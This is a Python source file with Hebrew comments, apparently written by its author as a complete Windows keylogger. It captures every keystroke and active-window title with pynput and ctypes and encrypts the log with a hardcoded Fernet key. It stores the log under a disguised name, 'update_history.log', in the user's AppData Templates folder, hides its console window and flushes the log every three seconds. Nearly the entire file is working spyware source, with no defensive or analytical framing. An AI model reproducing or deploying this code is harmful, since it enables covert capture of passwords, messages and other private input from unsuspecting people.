# ייבוא כל הספריות הנדרשות
import os                  # לטיפול בנתיבים ומשתני סביבה
import logging             # רישום הלוגים לקובץ בצורה מסודרת
import time                # מדידת זמן (למשל sleep בין שמירות)
import ctypes              # ממשק ישיר ל-Windows API – משמש לזיהוי חלון פעיל
from datetime import datetime  # לקבלת זמן נוכחי בפורמט יפה
from pynput import keyboard    # הספרייה הראשית – מאזינה לכל לחיצת מקש
import threading           # מאפשרת להריץ פונקציה ברקע (שמירה תקופתית)
import atexit              # קוראת לפונקציה כשהתוכנית נסגרת (שמירה אחרונה)
from cryptography.fernet import Fernet  # ספרייה להצפנה חזקה (AES-256)

# הגדרות ראשוניות
# נתיב חדש לקובץ הלוג – בתיקייה Templates של המשתמש המקומי
LOG_FILE = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Templates", "update_history.log")

# מפתח הצפנה שגינרטתי פעם אחת עם פרנט איתו אני מפענח בדיקריפטור
KEY = b'5eu0dSNzZtG1snv1gKL4I-Hzpxdf4N_F1Xfa9OwN-5Y='
cipher = Fernet(KEY)  # יוצר אובייקט הצפנה עם המפתח

# הגדרת הלוג – כותב רק את ההודעה המוצפנת (בלי timestamp אוטומטי)
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(message)s',
    filemode='a',          # תוסף לקובץ קיים
    encoding='utf-8'
)

buffer = []                # רשימה זמנית – מחזיקה את כל ההקלדות עד שמירה
current_window = ""        # שומר את שם החלון הפעיל כדי לזהות שינויים

# פונקציה שמחזירה שם החלון הפעיל (רק ב-Windows)
def get_active_window():
    global current_window
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()          # מקבל ID של החלון הנוכחי
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)   # מקבל אורך השם
        buff = ctypes.create_unicode_buffer(length + 1)            # מכין מקום לשמור את השם
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)  # כותב את השם ל-buff
        title = buff.value.strip()                                 # מנקה רווחים מיותרים
        if title and title != current_window:                      # אם השם השתנה
            current_window = title
            return f"\n[{datetime.now().strftime('%H:%M:%S')}] [WINDOW: {title}]\n"
        return ""
    except:
        return ""  # אם שגיאה (לא Windows או בעיה) – מחזיר ריק

# פונקציה ששומרת את מה שב-buffer לקובץ (עם הצפנה)
def flush_buffer():
    if not buffer:
        return
    content = "".join(buffer)                   # מחבר את כל התווים למחרוזת אחת
    ts = datetime.now().strftime('%H:%M:%S')    # זמן נוכחי
    message = f"[{ts}] {content}"               # הודעה מלאה
    encrypted = cipher.encrypt(message.encode('utf-8'))  # מצפין את ההודעה
    logging.info(encrypted.decode('utf-8'))     # כותב את ההצפנה כמחרוזת
    buffer.clear()                              # מנקה את הרשימה

# הפונקציה הראשית – מופעלת בכל לחיצת מקש
def on_press(key):
    # בודק אם חלון השתנה – אם כן, שומר ומתחיל שורה חדשה
    wnd = get_active_window()
    if wnd:
        flush_buffer()
        buffer.append(wnd)

    # נסיון להוסיף תו רגיל (אות, מספר, סימן)
    try:
        if key.char:
            buffer.append(key.char)
            return
    except AttributeError:
        pass  # זה מקש מיוחד – ממשיך למטה

    # טיפול במקשים מיוחדים
    if key == keyboard.Key.space:
        buffer.append(" ")
    elif key == keyboard.Key.enter:
        buffer.append("[ENTER]\n")     # מוסיף [ENTER] כדי שיראו אותו בפלט
        flush_buffer()                 # שומר מיד – כדי שלא ילך לאיבוד
    elif key == keyboard.Key.backspace:
        if buffer:
            buffer.pop()               # מוחק תו אחרון
    elif key == keyboard.Key.tab:
        buffer.append("\t")
    elif key == keyboard.Key.esc:
        buffer.append("[ESC]")
    elif key == keyboard.Key.caps_lock:
        buffer.append("[CAPS]")
    elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.ctrl):
        buffer.append("[CTRL]")
    elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.alt):
        buffer.append("[ALT]")
    elif key in (keyboard.Key.shift_l, keyboard.Key.shift_r, keyboard.Key.shift):
        buffer.append("[SHIFT]")
    else:
        # כל מקש לא מוכר – שם שלו בפורמט [שם]
        name = str(key).replace("Key.", "").upper()
        buffer.append(f"[{name}]")

    # אם הבאפר התמלא – שומר
    if len(buffer) > 100:
        flush_buffer()

# פונקציה שמריצה שמירה תקופתית כל 3 שניות (ברקע)
def periodic_flush():
    while True:
        time.sleep(3)
        flush_buffer()

# פונקציה לסיום (Ctrl+Alt+Q)
def stop_keylogger():
    flush_buffer()                      # שומר הכל לפני סגירה
    logging.info(f"\n[{datetime.now().strftime('%H:%M:%S')}] [STOPPED]")
    os._exit(0)                         # סוגר את התוכנית

# פונקציית ההרצה הראשית
def main():
    # הסתרת חלון cmd (עובד גם בסקריפט וגם ב-exe)
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass  # אם לא Windows או שגיאה – לא קריטי

    # מפעיל thread ששומר כל 3 שניות (ברקע, לא מפריע)
    threading.Thread(target=periodic_flush, daemon=True).start()

    # מבטיח שמירה אחרונה אם סוגרים את החלון בכוח
    atexit.register(flush_buffer)

    # יוצר מאזין למקלדת
    listener = keyboard.Listener(on_press=on_press)

    # יוצר hotkey לסיום (Ctrl+Alt+Q)
    hotkeys = keyboard.GlobalHotKeys({'<ctrl>+<alt>+q': stop_keylogger})
    hotkeys.start()  # חשוב: מפעיל את ה-hotkey קודם

    try:
        listener.start()    # מפעיל את המאזין
        listener.join()     # מחכה עד שמישהו יעצור אותו
    except KeyboardInterrupt:  # אם מישהו לחץ Ctrl+C
        stop_keylogger()
    finally:
        hotkeys.stop()      # סוגר את ה-hotkey

if __name__ == "__main__":
    main()